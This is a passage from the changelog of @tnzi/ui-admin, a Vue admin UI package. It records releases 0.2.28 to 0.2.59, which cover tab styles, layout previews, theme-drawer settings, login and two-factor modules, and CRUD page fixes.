- `useAdminThemeStore.closeTabByMiddleClick` (default `false` to match
  soybean) + `setCloseTabByMiddleClick` setter, persisted.
- `TabStyle` regained `'slider'` (we had dropped it in 0.2.55 on a
  faulty premise; G2 diagnosis confirmed slider is independent —
  transparent chip with 2px primary bottom border + 10% primary bg).
- `TThemeDrawer` Layout tab — `Close tab on middle click` switch.
- `tabs.pin` / `tabs.unpin` i18n keys + tab style 'slider' i18n labels.
- `AdminThemeSnapshotV1.closeTabByMiddleClick?` field (optional, importer
  treats absence as no-op).

**Changed** (`@tnzi/ui-admin`):

- `TLayoutModeCard` rewritten. Drops the `geometry switch + content-line`
  abstraction in favour of six explicit `v-if` blocks mirroring
  soybean's `layout-mode.vue:18-60`. Canvas is fixed `96 × 64 px`
  (was `1fr` aspect-ratio). Atomic primitives: `__sider`,
  `__sider--primary` (full primary), `__sider--tertiary` (30% primary),
  `__sider--w8` / `--w16` / `--w18` for widths; `__header`,
  `__header--primary`, `__header--secondary`, `__header--tertiary`;
  `__main` (20% primary). Each mode now draws a distinguishable
  preview, including the three previously-identical hybrid modes.
- `TThemeDrawer.t-theme-drawer__layout-grid` now `repeat(3, max-content)`
  + `column-gap: 16px / row-gap: 12px` so 6 fixed-width cards arrange
  as 2 rows × 3 cols (matches soybean's
  `grid grid-cols-2 gap-x-16px gap-y-12px md:grid-cols-3`).
- `TAdminTabs` rewritten:
  - **Chrome style** uses `<TChromeTabBg>` SVG (currentColor-tinted)
    + `-mr-18px` overlap so adjacent tabs interlock; active tab gets
    `z-index: 10` + `color: var(--tnzi-primary-rgb 0.10)`. Fixed
    `__chrome-divider` strip on the right (`right: 7px; height: 16px`),
    hidden on hover/active.
  - **Button style** is now a 4px-rounded rectangle with 1px border
    (was a 999px pill). Active = primary text + primary@10% bg +
    primary@30% border (was white text + 100% primary bg). Mirrors
    soybean's `button-tab.vue:38-46`. Fixes the previous "white text
    on 6% transparent purple = invisible" bug from 0.2.55.
  - **Slider style** restored: full-bar height, transparent bg,
    `border-bottom: 2px transparent → primary` on active.
  - Close button is now a circular 16x16 SVG `×` (matches soybean's
    `svg-close.vue`) instead of text `×`. Hover = white-on-#9ca3af
    grey, white-on-primary on the active tab.
  - Active tab `scrollIntoView({ inline: 'center' })` on route change
    (matches soybean's `scrollToActiveTab`).
  - Context menu gains a 6th item (Pin / Unpin) and 5 iconified rows
    (mdi:close, mdi:close-box-multiple-outline,
    mdi:format-horizontal-align-{left,right}, mdi:close-circle-outline,
    mdi:pin-{outline,off-outline}). Mirrors soybean's
    `global-tab/context-menu.vue:39-66`.
  - Close button hides for retained tabs (home + pinned) and slider
    style (matches soybean).
  - Middle-click close now reads `themeStore.closeTabByMiddleClick`
    when no explicit `closeByMiddleClick` prop is provided.
- `TAdminSidebar` — vertical-mix `menuOptions` now includes the icon
  via `() => h(TSvgIcon, { icon, size: 20 })`. Previously the rail
  rendered as a label-only column because the option-mapping shape
  silently dropped icons. Active/hover NMenu vars adjusted to
  soybean palette: hover = neutral grey 6%, active = primary 10%.
- `TAdminShell` — vertical-mix sub-sider NMenu gains `:expanded-keys`
  bound to a route-derived ancestor path so the drawer auto-expands
  the active leaf's parent group.
- `TAdminShell.__sub-sider-title` font-weight 600 → 700 (matches
  soybean's `text-primary font-bold`).

**Migration**: see [MIGRATION.md `0.2.x` → `0.2.59`](./MIGRATION.md#0259).

## [0.2.58] — 2026-05-15 (`@tnzi/ui-admin` Phase F — accessibility filters + preset cards)

Long-tail soybean parity: accessibility filters (grayscale + colour-
weakness simulation), info-follows-primary linkage, and preset cards
in the Preset tab.

**Added** (`@tnzi/ui-admin`):

- `useAdminThemeStore.grayscale` + `colourWeakness` state, with
  `setGrayscale` / `setColourWeakness` setters that apply
  `document.documentElement.style.filter` (grayscale 100%,
  invert 80%). Mirrors soybean's `toggleAuxiliaryColorModes`.
  Both persisted; `reset()` clears them and the filter.
- `TThemeDrawer` Appearance tab — Grayscale + Colour-weakness switches.
- `TThemeDrawer` Preset tab — preset cards grid (up to 8 from
  `resolvedPresets`). Each card shows the primary colour swatch + name
  and clicking applies the colour. Mirrors soybean's preset block
  in `theme-drawer/modules/preset/index.vue`.
- `infoFollowPrimary` now actually links: when the toggle is on and
  the user changes the primary colour, the info colour follows
  automatically (matches soybean `theme-color.vue:67-69`).
- `AdminThemeSnapshotV1` — `grayscale?` + `colourWeakness?` fields
  added (optional, importer treats absence as no-op).

## [0.2.57] — 2026-05-15 (`@tnzi/ui-admin` Phase E — hybrid layout layered menus)

The 4 hybrid layout modes finally render distinct menu structures
instead of all looking like "vertical + horizontal stacked together".
Replaces the inline `activeFirstLevelKey` walker with a proper
composable that mirrors soybean's `provideMixMenuContext()`.

**Added** (`@tnzi/ui-admin`):

- `headless/useAdminMenuContext.ts` — Phase E composable. Exposes
  `firstLevelMenus` / `secondLevelMenus` / `childLevelMenus` /
  `activeFirstLevelMenuKey` / `activeSecondLevelMenuKey` /
  `isActiveFirstLevelMenuHasChildren` / `handleSelectFirstLevelMenu` /
  `handleSelectSecondLevelMenu` / `resolveFirstLevelKeyForRoute`.
  Fallback rule: if the current route doesn't match any menu key,
  default the active 1st level to the first item with children
  (fixes the long-standing vertical-mix bug where Workbench landed
  with the drawer permanently empty). 11 unit tests cover the
  composable.
- `TAdminSidebar` — `:items` prop overrides the default
  `routeStore.menus` source. Hybrid modes pass the layered slice the
  sider should render.
- `TAdminTopMenu` — `:items` prop + `:active-key` prop; same purpose.

**Fixed** (`@tnzi/ui-admin`):

- **3 hybrid modes were visually identical** to vertical-mix /
  horizontal because the sider always rendered the full menu tree.
  Now:
  - `vertical-hybrid-header-first` → top hosts 1st level + sider
    hosts the children of the active 1st level.
  - `top-hybrid-sidebar-first` → top hosts the 2nd level (children
    of the active 1st level) + sider hosts the 1st level rail.
  - `top-hybrid-header-first` → top hosts 1st level + sider hosts
    the children of the active 1st level. Sider auto-collapses to
    `width: 0` when the active 1st level has no children
    (matches soybean's `siderVisible` rule).
- **`vertical-mix` drawer was permanently empty when landing on a
  childless 1st level** (e.g. Workbench). Active 1st level now falls
  back to the first item with children, so the drawer ships with
  meaningful content.
- **`TLayoutModeCard` previews for modes 4/5/6 were all identical
  geometry**, so the theme drawer's layout grid had three
  visually-indistinguishable cards. Added `siderVariant: 'normal' |
  'rail'` + per-mode geometry so each card draws a distinct preview.

**Migration**: see [MIGRATION.md `0.2.x` → `0.2.57`](./MIGRATION.md#0257).

## [0.2.56] — 2026-05-15 (`@tnzi/ui-admin` Phase D — drawer parity)

soybean parity follow-up: theme drawer gains the missing controls, the
brittle visual chrome (per-row dashed border, deeply-buried reset) is
cleaned up, and Reset/Copy now live in a persistent drawer footer.

**Added** (`@tnzi/ui-admin`):

- `useAdminThemeStore` — six new soybean-parity settings:
  `recommendColor` (boolean), `infoFollowPrimary` (boolean),
  `tabCache` (boolean), `breadcrumbShowIcon` (boolean),
  `multilingualVisible` (boolean), `globalSearchVisible` (boolean).
  All persisted, all reset to soybean defaults on `reset()`.
- `TThemeDrawer`:
  - **Appearance tab** — `themeRadius` slider (0-16px), `recommendColor`
    switch, `infoFollowPrimary` switch.
  - **Layout tab** — `siderCollapsedWidth` slider (48-100px),
    `tabCache` switch, `breadcrumbShowIcon` switch.
  - **General tab** — `multilingualVisible` switch,
    `globalSearchVisible` switch.
- `AdminThemeSnapshotV1` — six new optional fields on `admin` block;
  importer treats absence as "keep current" (no-op).

**Changed** (`@tnzi/ui-admin`):

- `TThemeDrawer` — Reset + Copy buttons lifted out of the Preset tab
  into the `NDrawerContent #footer` slot so they're reachable from
  every tab. Mirrors soybean's
  `theme-drawer/components/config-operation.vue:51-54`.
- `TThemeDrawer` — `.t-theme-drawer__row` no longer renders a dashed
  bottom border; soybean uses a flat 12px-gap stack and the dashes
  added visual noise. Reduced row padding from 10px → 8px.
- `useAdminThemeStore.reset()` resets all six new fields to their
  defaults along with the existing ones.

**Removed** (`@tnzi/ui-admin`):

- `t-theme-drawer__reset` custom button class (the destructive button
  inside the Preset tab). Reset now uses a standard `NButton` in the
  footer.

## [0.2.55] — 2026-05-15 (`@tnzi/ui-admin` Phase C — tab style + horizontal header guard)

**Fixed** (`@tnzi/ui-admin`):

- `TAdminTabs` button-style active tab now actually paints the primary
  background and white text. The previous rule
  `[data-style='button'] .t-admin-tabs__tab--active { background-color: ... }`
  had identical CSS specificity to the base `.t-admin-tabs__tab--active`
  rule and lost the cascade race on cold mount, leaving active tabs
  transparent + purple-text (chrome-style fallback). Switched the active
  rule to read `var(--t-tab-active-bg, transparent)` /
  `var(--t-tab-active-color, var(--tnzi-primary))` /
  `var(--t-tab-active-underline-display, block)`; the data-style selector
  now only redefines the vars at the parent (specificity stops
  mattering). Drag/drop wrapper from `vue-draggable-plus` no longer
  blocks visual updates.
- `TAdminShell.headerVisible` computed now forces `true` whenever the
  layout mode hosts the menu in the header (`horizontal`,
  `vertical-hybrid-header-first`, `top-hybrid-sidebar-first`,
  `top-hybrid-header-first`). Previously a user toggling "Show header"
  off in horizontal mode would lose all navigation — the menu lived in
  the now-hidden header and the sider was suppressed by mode.
- `TThemeDrawer` "Show header" toggle is now `:disabled` in the four
  header-hosted layouts and reads `true` while disabled, communicating
  the constraint instead of silently no-op-ing.

**Removed** (`@tnzi/ui-admin`):

- `tabStyle: 'slider'` — soybean only ships `chrome` and `button`,
  and our slider variant was visually indistinguishable from chrome.
  `TabStyle` type narrowed; `setTabStyle('slider')` now silently
  rejects (validation drops it). Persisted snapshots from 0.2.54
  containing `tabStyle: 'slider'` will load the field as the default
  `'chrome'` (validation gate).

**Migration**: see [MIGRATION.md `0.2.x` → `0.2.55`](./MIGRATION.md#0255).

## [0.2.54] — 2026-05-15 (`@tnzi/ui-admin` Phase B — invertSider 真实现)

soybean parity follow-up: `invertSider` setting now actually inverts the
sider including the menu items, not just the empty wrapper underneath.

**Fixed** (`@tnzi/ui-admin`):

- `TAdminSidebar` accepts an `:inverted` prop. When true, it switches its
  own surface chrome (sider bg via `--tnzi-admin-sider-inverted-bg`,
  brand title to inverted-text, footer border to inverted-border) and
  passes `:inverted="true"` to the inner `<NMenu>` so menu item text /
  hover / active colours flip via Naive's inverted theme. Previously
  the toggle drove a `.t-admin-shell--invert-sider .t-admin-shell__sider`
  wrapper rule that lost the cascade race to the child component's own
  scoped `background: var(--tnzi-admin-sider-bg, ...)` declaration —
  the wrapper went dark while the inner sidebar stayed white.
- `TAdminShell` computes `siderInverted = themeStore.invertSider &&
  !isDark && layoutMode in ['vertical', 'vertical-mix']` and passes
  it to both the desktop sider and the mobile drawer sider. Mirrors
  soybean's `darkMenu = !darkMode && layout.includes('vertical')` —
  the toggle has no visible effect outside the supported combinations
  so the drawer hides it (see `TThemeDrawer` change below).

**Changed** (`@tnzi/ui-admin`):

- `TThemeDrawer` moved the `invertSider` switch from the Layout tab
  to the Appearance tab (where soybean keeps it), and gated its
  display with `v-if="!isDark && layoutMode.startsWith('vertical')"`
  so it doesn't appear when the toggle wouldn't do anything. Drops
  the previous wrapper-bg hack CSS from `TAdminShell`.

## [0.2.53] — 2026-05-15 (`@tnzi/ui-admin` Phase A — 4 救命修复)

Round-1 of soybean-parity audit follow-up. Four user-visible defects
fixed in one release; all gated by static checks (typecheck + 659
unit tests green).

**Fixed** (`@tnzi/ui-admin`):

- **CRUD edit/view modal never opens** (`headless/useFormModal.ts`) —
  `cloneInitial` called `structuredClone` on Vue reactive Proxy
  objects, which by spec throws `DataCloneError`. The exception fired
  before `visible.value = true`, so the modal stayed closed silently
  on every row edit. Fix: strip Proxy via `toRaw` before cloning, and
  fall back to JSON round-trip if `structuredClone` still rejects.
  Affected ~40 admin preset pages (every TCrudPage edit/view button
  was inert in production; unit tests passed because they constructed
  plain objects bypassing the reactive path).
- **Route transitions never trigger** (`router/AdminShellRoot.vue`) —
  `<router-view />` was nested inside `TAdminContent`'s `<Transition>`
  wrapper, but Vue's transition tracks the direct child slot, not
  whatever the slot's component swaps to. Replaced with the existing
  `TAdminRouterView` component, which uses the canonical
  `<RouterView v-slot>` + `<Transition>` + `<component :is>` pattern
  and was already written but unused. All 6 transition presets
  (fade / fade-slide / fade-bottom / fade-scale / zoom-fade /
  zoom-out) now actually animate.
- **Content area drifted cold-purple** (`styles/variables.css`) —
  `--tnzi-admin-content-bg` was defined as
  `color-mix(layout 95%, primary 5%)` based on a misread of soybean's
  behaviour. soybean's `bg-layout` is the flat container surface; no
  primary is mixed in. Removed the color-mix and aliased
  `--tnzi-admin-content-bg` directly to `--tnzi-layout-bg`. Content
  area now matches soybean's neutral grey across light + dark.

**Removed** (`@tnzi/ui-admin`):

- **`invertHeader` setting + toggle + CSS** — soybean has no inverted
  header (the header always follows the global light/dark mode), and
  our implementation was visually broken anyway: the wrapper
  `:deep(.t-admin-header) { background: ... }` rule had identical
  CSS specificity as the child component's own scoped rule and lost
  the cascade race, producing "black background, grey icons" garbage.
  Dropped from `useAdminThemeStore` (state, setter, persistence pick),
  `theme/admin-config.ts` (snapshot type), `TThemeDrawer` (control
  + import/reset wiring), `TAdminShell` (class + CSS rule),
  `variables.css` (light + dark token), and both i18n catalogues.
  Persisted snapshots from 0.2.52 missing the field on next read are
  no-ops (boolean default falsy).

**Migration**: see [MIGRATION.md `0.2.x` → `0.2.53`](./MIGRATION.md#0253).

## [0.2.36] — 2026-05-15 (`@tnzi/ui-admin` TCrudPage soybean-parity restructure)

Reshape `TCrudPage` to match soybean's two-card CRUD layout (visible
in `9527/manage/user`): a collapsible search panel card on top + a
list card with sub-title + action buttons row + table + footer
pagination. Existing consumer pages keep working without changes
(the same slot API + state contract is preserved).

**Changed** (`@tnzi/ui-admin`):

- `TCrudPage` template restructured:
  - Outer `NSpace` (size 16) wrapping the page so cards stack with
    consistent vertical rhythm.
  - **Search panel**: `NCard` containing `NCollapse / NCollapseItem`
    titled "Search" (collapsed by default). Renders the default
    `NInput` search field when no `#search` slot is supplied. Hidden
    entirely if `showDefaultSearch: false`.
  - **List card**: `NCard` with sub-title in `#header` (uses page
    `title` or i18n `admin.crud.list`) and the 4-button action strip
    in `#header-extra`. Buttons:
    - `+ Create` (primary tertiary, mdi:plus icon).
    - `🗑 Batch Delete` (error tertiary, mdi:trash-can-outline; disabled
      when no rows selected).
    - `↻ Refresh` (tertiary, mdi:refresh).
    - `📤 Export` / `📥 Import` (tertiary, opt-in via
      `showExport` / `showImport` — default `false`).
    - `⚙ Columns` (tertiary, mdi:cog-outline, opens the existing
      column-setting popover).
  - **Table** uses NDataTable's built-in `pagination` prop instead of
    a separate `NPagination`. The pagination footer shows
    `Total N` prefix + page index + size picker — matches soybean's
    "共 N 条 | 1 2 ... | 10/页" layout.

**Added props** (`TCrudPage`):

- `showBatchDelete: boolean` (default `true`).
- `showExport: boolean` (default `false`).
- `showImport: boolean` (default `false`).
- `showDefaultSearch: boolean` (default `true`).

**Removed dependency**:

- `TCrudToolbar` is no longer rendered by `TCrudPage`. Existing
  consumers that imported it directly keep working — it stays
  exported, just no longer wired into the default page shape.
  Test selector `.t-crud-toolbar__refresh` is preserved on the new
  inline Refresh button so existing tests don't break.

**Added locale keys** (en + zh-cn):

- `admin.crud.batchDelete` ("Batch Delete" / "批量删除")
- `admin.crud.search` ("Search" / "搜索")
- `admin.crud.list` ("List" / "列表")
- `admin.crud.total` ("Total" / "共")
- `admin.crud.actions` ("Actions" / "操作")

**Test updates**:

- `TCrudPage.test.ts` stubs extended with NCard / NCollapse /
  NCollapseItem / NSpace passthroughs so slot content keeps rendering.
- `.t-crud-toolbar__refresh button` selector simplified to
  `.t-crud-toolbar__refresh` (the stub Button renders the same DOM
  node it always did — the wrapping container changed).

Visual verification (Chrome side-by-side against
localhost:9527/manage/user):

- Search collapse panel `> Search` on top.
- List card titled "User Management" with 4 action buttons (Create
  / Batch Delete / Refresh / Columns) right-aligned.
- Pagination footer "Total 1 | 1 | 20 / page" right-aligned.
- Sidebar / header / tabs / footer all unchanged from 0.2.35.

Tests: 659 (`@tnzi/ui-admin`) — green.

Remaining polish (not yet shipped):
- Serial-number column + Actions column (edit/delete) — page-level
  customisation, not a framework concern.
- WeChat bind module + various i18n zh-cn completion.

## [0.2.35] — 2026-05-15 (`@tnzi/ui-admin` soybean-detail polish: header/sidebar/tabs)

Side-by-side review against `localhost:9527/manage/user` surfaced a
batch of styling details where the reference consumer diverged from the soybean
reference. All fixed in this patch (no API changes).

**Changed** (`@tnzi/ui-admin`):

- `TAdminHeader.showReload` default flipped from `true` to `false`
  via `TAdminShell` (the tab bar already has its own reload button,
  matching soybean — no duplicate icon in the header).
- `TAdminHeader` language switcher: dropped the "EN" / "中" label
  next to the translate icon (soybean shows only the icon). Icon
  size bumped 18→20 to match its neighbours.
- `TAdminSidebar` active menu row: removed the 3px primary
  left-border accent. Soybean uses only the bg highlight + primary
  text weight; the I.7.6 brief's "3px left-border" spec was
  inaccurate. Active row keeps `font-weight: 500` for emphasis.
- `TSystemLogo`:
  - Title font dropped from 18px to 16px (matches soybean's
    `Soybean 管理系统`).
  - Title `white-space: nowrap` so the brand never wraps.
  - Layout switched to inline `display: inline-flex` styles so the
    flex layout survives cross-package CSS-ordering edge cases
    (observed under unocss + library bundling, where the scoped
    `display: flex` rule was being silently reset to `block`).
- `TAdminSidebar` header now overrides `:deep(.t-system-logo__title)`
  to `var(--tnzi-base-text)`. Login page's stacked layout keeps the
  larger primary-coloured title.
- `useAdminThemeStore.siderWidth` default bumped 220 → 240. Soybean's
  220 is fine for 4-char CJK labels but Tnzi's English labels
  ("User Management" / "Role Management" / etc) need 240 to render
  without ellipsis truncation.
- `TAdminTabs` chrome polish:
  - Tab height reduced 32→28px, padding tightened.
  - Active tab gets a 2px primary underline anchor (matching
    Chrome's active-tab look + soybean's pattern).
  - Subtle 1px separator between adjacent inactive tabs (hidden
    when either side becomes active or hovered).

Visual verification (Chrome side-by-side against localhost:9527):
header utility icons match (search/fullscreen/translate/theme/avatar
with no duplicate reload), sidebar logo is `[icon] [bold black title]`
in one line, active menu row is bg-highlight only, tab bar shows
chrome-style underline + subtle separators.

Tests: 659 (`@tnzi/ui-admin`) — green.

Remaining (CRUD page restructure, soybean-style search/list cards
with action-buttons-with-icons + row-actions column + full
pagination): tracked separately as a Tier-3 follow-up.

## [0.2.34] — 2026-05-15 (`@tnzi/ui-admin` Phase I.7.5: TwoFactorChallenge module + 2FA helpers)

Wires the last login-page placeholder — the two-factor challenge step
that fires after a `pwdLogin` / `codeLogin` returns `requires2FA: true`.

**Added** (`@tnzi/ui-admin`):

- `pages/login/modules/TwoFactorChallenge.vue` — verification module
  showing the active challenge's user name + delivery channel
  ("authenticator app" / "SMS" / "email"), a numeric code input
  (`autocomplete="one-time-code"`, `inputmode="numeric"`), a Verify
  primary button, a conditional Resend button (with `useCaptcha`
  cooldown — shown only when the consumer supplies
  `callbacks.resendTwoFactor`), and Cancel that clears the challenge
  and returns to `pwd-login`.
- `LoginCallbackHelpers` type: `{ setTwoFactorRequired,
  clearTwoFactor }`. Passed as the second argument to `pwdLogin` /
  `codeLogin` callbacks so consumer code can transition to the
  two-factor UI without reaching into Vue state directly.
- `LoginContext.pendingTwoFactor: Ref<TwoFactorChallenge | null>` —
  reactive state shared between PwdLogin / CodeLogin (who set it via
  `helpers.setTwoFactorRequired`) and TwoFactorChallenge (who reads
  it). TLoginPage watches this ref and auto-toggles the active module
  to `two-factor` when it flips non-null.
- `LoginCallbacks.verifyTwoFactor` + `resendTwoFactor` callback slots
  (wire to `POST /auth/verify-2fa` and `POST /auth/send-2fa-code`
  respectively).
- New `LoginModule` value `'two-factor'`. `routes.ts` updates the
  login route regex to accept it; `pages/login/index.vue` registers
  the new module component.
- Top-level exports added: `TwoFactorChallengeModule`,
  `LoginCallbackHelpers`, `LoginDemoAccount`, `VerifyTwoFactorPayload`,
  `TwoFactorChallenge`.

**Changed** (`@tnzi/ui-admin`):

- `PwdLogin.handleSubmit` and `CodeLogin.handleSubmit` now pass
  `helpers` as the second argument to their callbacks. Consumer
  signature change:
  ```ts
  // Before:
  pwdLogin: async ({ userName, password, remember }) => { … }
  // After:
  pwdLogin: async ({ userName, password, remember }, { setTwoFactorRequired }) => { … }
  ```
  Existing callbacks that ignore the second argument keep working.
- `TLoginPage.DEFAULT_LABELS` adds `'two-factor': 'Two-Factor Verification'`.
- `TLoginPage.toggleLoginModule` clears `pendingTwoFactor` whenever
  the user navigates away from the two-factor module mid-flow.

Visual verification (Chrome): `/login/two-factor` renders the module
with title "Two-Factor Verification", the prompt "Enter the code from
your authenticator app.", numeric input with one-time-code autofill,
purple Verify button, and Cancel.

Tests: 659 (`@tnzi/ui-admin`) — green.

Phase I.7 remaining: I.7.10-I.7.12 (theme drawer rework + mix layout
hover) — the optional polish tier.

## [0.2.33] — 2026-05-15 (`@tnzi/ui-admin` CRUD page i18n double-prefix fix)

CRUD pages were surfacing raw `admin.crud.searchPlaceholder` /
`admin.crud.create` / etc. labels because
`translatePageKey('identity.roles', 'admin.crud.searchPlaceholder')`
prepended the namespace blindly, producing
`admin.modules.identity.roles.admin.crud.searchPlaceholder` — a path
that never exists in the locale dictionary.

**Changed** (`@tnzi/ui-admin`):

- `pages/_shared/translate.ts.translatePageKey()`:
  - Strips optional `tnzi.` prefix (callers can use either form).
  - When the key already starts with `admin.` it's looked up **directly**
    at the locale root — the page namespace is ignored. This fixes the
    double-prefix bug TCrudPage / TBatchActions / TCrudToolbar all hit
    by forwarding their `admin.crud.*` literals into the page-level
    translator.
  - Otherwise prepends `admin.modules.{pageNs}.{key}` as before.
  - Falls back to a humanised last-segment label on miss (matches the
    fallback in `useAdminRouteStore.resolveI18nKey`,
    `TAdminAutoBreadcrumb`, and `TAdminTabs.renderTitle`).

Visual verification (Chrome): `/admin/identity/roles` now shows
"Search..." / "Create" / "Refresh" / "Role Name" / etc. — all the
strings `en.ts` already had keys for but the translator was
mis-prefixing.

Tests: 659 (`@tnzi/ui-admin`) — green.

## [0.2.32] — 2026-05-15 (`@tnzi/ui-admin` default Workbench dashboard + i18n humanise fallback)

Replaces the `/admin → /admin/identity/users` redirect with a proper
default landing page matching soybean's `Home` workbench, and stops
raw `tnzi.admin.…` strings from leaking into the sidebar.

**Added** (`@tnzi/ui-admin`):

- `pages/dashboard/Workbench.vue` — default landing page rendered at
  `/admin/workbench`. Composes `THeaderBanner` (greeting +
  date), `TDashboardPage` (4 gradient KPI cards + line chart + pie
  chart), and `TProjectTimeline` + a Tips card. Data is canned so a
  fresh consumer never lands on a blank screen.
- `/admin/workbench` route registered with `keepAlive` +
  `fixedIndexInTab: 0` so it acts as the pinned home tab in the tab bar.
- `DEFAULT_ROUTE_ICONS.workbench = 'mdi:view-dashboard-outline'`.

**Changed** (`@tnzi/ui-admin`):

- `routes.ts` `/admin` redirect target switched from
  `/admin/identity/users` to `/admin/workbench`.
- `useAdminRouteStore.resolveI18nKey` now humanises missing i18n keys
  (e.g. `tnzi.admin.modules.workbench.title` → "Workbench",
  `tnzi.admin.modules.identity.loginLogs.title` → "Login Logs") instead
  of returning the raw dotted string. Mirrors the same fallback in
  `TAdminAutoBreadcrumb` and `TAdminTabs.renderTitle` so sidebar /
  breadcrumb / tabs all show a single humanised surface when the
  consumer hasn't seeded a full i18n pack.

Visual verification (Chrome): `/admin` now redirects to
`/admin/workbench` and renders the soybean-parity layout — greeting
banner, 4 KPI tiles with animated count-ups, ECharts line + pie, and
the activity timeline at the bottom. Sidebar shows "Workbench" / "Login
Log" / etc. as humanised labels instead of `tnzi.admin.modules.…`.

Tests: 659 (`@tnzi/ui-admin`) — green.

## [0.2.31] — 2026-05-15 (`@tnzi/ui-admin` Phase I.7.3-I.7.5: CodeLogin / Register / ResetPwd modules)

Three of the four remaining login-page placeholder modules are now wired
to real form submission. Each follows the same shape: NForm with a
`useFormRules`-validated input row, a `useCaptcha`-throttled send-code
button, a primary submit calling the consumer's `useLoginContext()`
callback, and a "Back" button that returns to `pwd-login`.

**Added** (`@tnzi/ui-admin`):

- `useCaptcha({ seconds?, translate? })` composable in `headless/` —
  60-second cooldown timer + in-flight loading flag + locale-aware
  label ("Get Code" / "60s" / spinner). Source-fidelity port of
  soybean's `useCaptcha` (omitting its `$message`-based phone
  validation; the form-level rule handles that).
- `CodeLogin.vue` — phone/email account + verification code login.
  Calls `callbacks.sendCode({ purpose: 'code-login' })` to trigger the
  code and `callbacks.codeLogin({ account, code })` to submit.
- `Register.vue` — phone/email + code + password + confirmPassword
  registration. Calls `callbacks.sendCode({ purpose: 'register' })`
  and `callbacks.register({ account, code, password })`. On success
  bounces back to `pwd-login` (soybean's flow).
- `ResetPwd.vue` — phone/email + code + new password + confirm. Calls
  `callbacks.sendCode({ purpose: 'reset-pwd' })` and
  `callbacks.resetPwd({ account, code, password })`. On success
  bounces back to `pwd-login`.

All three modules:

- Use `useFormRules` for shared phone / password validators.
- Validate the account field on its own before firing `sendCode` (so
  the user gets a clear "invalid phone" message instead of a confusing
  server error).
- Display submit errors inline (red text under the form) with
  `role="alert"`.
- Render via the new `useCaptcha` cooldown so the user can't spam the
  send-code endpoint.

Endpoints they map to (configured on the consumer side):

| Module     | sendCode → backend                              | submit → backend                          |
|------------|-------------------------------------------------|-------------------------------------------|
| CodeLogin  | `POST /auth/code-login/send-code`               | `POST /auth/code-login`                   |
| Register   | `POST /auth/quick-register/send-code`           | `POST /auth/register` or `quick-register` |
| ResetPwd   | `POST /auth/password-recovery/send-code`        | `POST /auth/password-recovery/reset`      |

Visual verification (Chrome): all three routes
(`/login/code-login`, `/login/register`, `/login/reset-pwd`) render
their respective forms with consistent visual rhythm, Get-Code button
disables during cooldown, "Back" returns to `/login/pwd-login`.

Tests: 659 (`@tnzi/ui-admin`) — green.

Phase I.7 remaining: I.7.5 (TwoFactorChallenge module — back-end
already supports `POST /auth/send-2fa-code` + `/auth/verify-2fa`,
just needs the UI), I.7.10-I.7.12 (theme drawer + mix layout), the
deferred default Dashboard page, and CRUD-page i18n cleanup.

## [0.2.30] — 2026-05-15 (`@tnzi/ui-admin` Phase I.7.9: default footer copyright)

Footer was rendering as a bare grey strip because `TAdminShell.footer.copyright`
was undefined when consumers didn't supply one. `AdminShellRoot` now derives a
default `Copyright © {year} {brand}` line from `useAdminLoginConfig().brand`,
matching soybean's `Copyright MIT © 2021 Soybean` baseline.

**Added** (`@tnzi/ui-admin`):

- `AdminLoginConfig.footer.copyright` / `footer.links` — consumer can
  override the copyright line entirely or append link entries (e.g.
  ToS / Privacy). Empty/missing falls back to the auto-derived
  default.
- `AdminShellRoot` computed `footerCopyright`:
  - Uses `loginConfig.footer.copyright` when supplied.
  - Otherwise: `Copyright © ${new Date().getFullYear()} ${brand}`.
- `AdminShellRoot` forwards `:footer="{ copyright, links }"` into
  `<TAdminShell>`.

Visual verification (Chrome): the footer now reads "Copyright © 2026
the app name" in muted text at the bottom of the content column.

Tests: 659 (`@tnzi/ui-admin`) — green.

Phase I.7 remaining: I.7.3-I.7.5 (CodeLogin / Register / ResetPwd /
2FA modules), I.7.10-I.7.12 (theme drawer rework + mix layout
hover), the deferred default Dashboard page, and the broader
CRUD-page i18n key cleanup tracked in the I.7.x backlog.

## [0.2.29] — 2026-05-15 (`@tnzi/ui-admin` Phase I.7.8: tab bar auto-push + click navigation)

Closes the tab-bar gap surfaced by the soybean side-by-side review: tab
list was empty on every page load because nothing was calling
`tabStore.addTab()` on route change, and `switchRouteByTab` was a stub
that flipped `activeTabId` without actually navigating.

**Added** (`@tnzi/ui-admin`):

- `AdminShellRoot` now watches `useRoute()` (immediate) and pushes the
  current route into `tabStore.addTab()` on every navigation. Bare
  `/admin` redirect (`admin-root`) is skipped. Initial page load seeds
  the first tab so users land on a populated tab bar instead of an
  empty strip.
- `AdminShellRoot.onTabClick(tab)` wires `router.push(tab.fullPath)`
  so clicking an inactive tab actually navigates to that route. The
  same handler is bound to the `tab-click` event TAdminShell now
  re-emits from `TAdminTabs`.
- `TAdminShell.tabClick` emit signature so the event bubbles cleanly
  to consumer routes (typed as `AdminTab`).
- `TAdminTabs.renderTitle()` — translate-then-humanise fallback (e.g.
  `tnzi.admin.modules.identity.users.title` → "Users") so missing
  i18n keys never surface raw to the user. Mirrors the same fallback
  in `TAdminAutoBreadcrumb`.

Visual verification (Chrome): clicking `/admin/identity/users` →
`/admin/identity/roles` shows both tabs in the chrome strip, with the
active tab styled in primary purple. Tabs are draggable via the
existing `vue-draggable-plus` integration. Close buttons remove the
tab and pin tabs (`homeTab`) stay anchored.

Tests: 659 (`@tnzi/ui-admin`) — green.

Known follow-up: built-in admin pages (TCrudPage et al.) still surface
raw `admin.crud.*` i18n keys in their internal labels because they're
wired to a translate function that returns the key unchanged when
missing. That's a CRUD-page-level i18n gap, not a tab-bar issue;
folded into the broader Phase I.7.9 / I.7.x backlog.

## [0.2.28] — 2026-05-15 (`@tnzi/ui-admin` Phase I.7.7: header breadcrumb + user avatar dropdown)

Soybean-parity overhaul for the admin header, closing the last
structural gap before the visual side-by-side matches end-to-end.

**Added** (`@tnzi/ui-admin`):

- `TAdminAutoBreadcrumb` — route-driven wrapper around the existing
  `TAdminBreadcrumb`. Walks `route.matched`, drops the bare `/admin`
  shell root + anything flagged `hideInMenu`, and renders each crumb
  with its mdi icon (from the same `DEFAULT_ROUTE_ICONS` map the
  sidebar uses). Leaf crumbs are clickable; branch crumbs are static.
  Falls back to a humanised key when the translate function misses.
- `TAdminUserAvatar` — header user dropdown matching soybean's
  `user-avatar.vue`. Renders an avatar icon + display name, opens a
  click dropdown with "User Center" / "Logout", confirms logout via
  `NDialog`. Has a "Sign in" button mode for unsigned users.
- `AdminLoginConfig.user` config slot: `{ userName, avatarIcon,
